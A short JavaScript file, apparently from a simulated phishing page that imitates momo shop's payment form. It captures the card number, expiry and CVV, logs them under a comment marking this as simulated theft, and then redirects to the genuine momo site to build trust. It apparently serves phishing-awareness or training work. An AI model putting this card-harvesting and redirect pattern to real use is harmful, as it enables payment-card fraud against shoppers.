document.getElementById("paymentForm").addEventListener("submit", function(e) {
    e.preventDefault();

    const cardNumber = document.getElementById("cardNumber").value.trim();
    const expiry = document.getElementById("expiry").value.trim();
    const cvv = document.getElementById("cvv").value.trim();
    const errorText = document.getElementById("paymentError");

    if (!cardNumber || !expiry || !cvv) {
        errorText.textContent = "請完整填寫所有欄位。";
        return;
    }

    // 模擬資料竊取
    console.log("模擬竊取信用卡資訊：", cardNumber, expiry, cvv);

    errorText.textContent = "";

    // 模擬延遲導向 momo 真頁，增加信任感
    setTimeout(() => {
        window.location.href = "https://www.momoshop.com.tw/main/Main.jsp";
    }, 2500);
});
